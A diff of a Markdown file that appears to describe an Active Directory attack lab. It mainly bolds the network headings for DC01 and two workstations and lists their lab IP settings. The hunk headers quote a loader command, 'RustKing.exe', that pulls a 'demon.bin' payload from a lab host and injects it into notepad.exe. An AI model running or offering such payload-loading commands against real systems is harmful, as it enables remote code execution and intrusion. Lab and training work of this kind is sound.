@@ -367,7 +367,7 @@ C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.ex
 
 ### Active Directory Network Addresses
 1. **DC01**
-    - Secure Network
+    - **Secure Network**
         - Static IPv4: `10.10.101.131`
         - Subnet Mask: `255.255.255.0`
         - Default Gateway: `10.10.101.1`
@@ -375,36 +375,36 @@ C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.ex
         - Alternate DNS: `8.8.8.8`
 
 2. **WORKSTATION-01**
-    - External Network
+    - **External Network**
         - Dynamic IPv4: `192.168.25.149` (DHCP will assign)
         - Subnet Mask: `auto-assigned`
         - Default Gateway: `auto-assigned`
         - Preferred DNS: `auto-assigned`
         - Alternate DNS: `auto-assigned`
         
-    - Internal Network
+    - **Internal Network**
         - Static IPv4: `10.10.100.128`
         - Subnet Mask: `255.255.255.0`
         - Default Gateway: 
         - Preferred DNS: `10.10.100.129`
         - Alternate DNS: `8.8.8.8`
         
-    - Secure Network
+    - **Secure Network**
         - Static IPv4: `10.10.101.129`
         - Subnet Mask: `255.255.255.0`
         - Default Gateway: `10.10.101.1`
         - Preferred DNS: `10.10.101.131`
         - Alternate DNS: `8.8.8.8`
 
-3. ****WORKSTATION-02**
-    - Internal Network
+3. **WORKSTATION-02**
+    - **Internal Network**
         - Static IPv4: `10.10.100.129`
         - Subnet Mask: `255.255.255.0`
         - Default Gateway: 
         - Preferred DNS: `10.10.100.128`
         - Alternate DNS: `8.8.8.8`
         
-    - Secure Network
+    - **Secure Network**
         - Static IPv4: `10.10.101.132`
         - Subnet Mask: `255.255.255.0`
         - Default Gateway: `10.10.101.1`
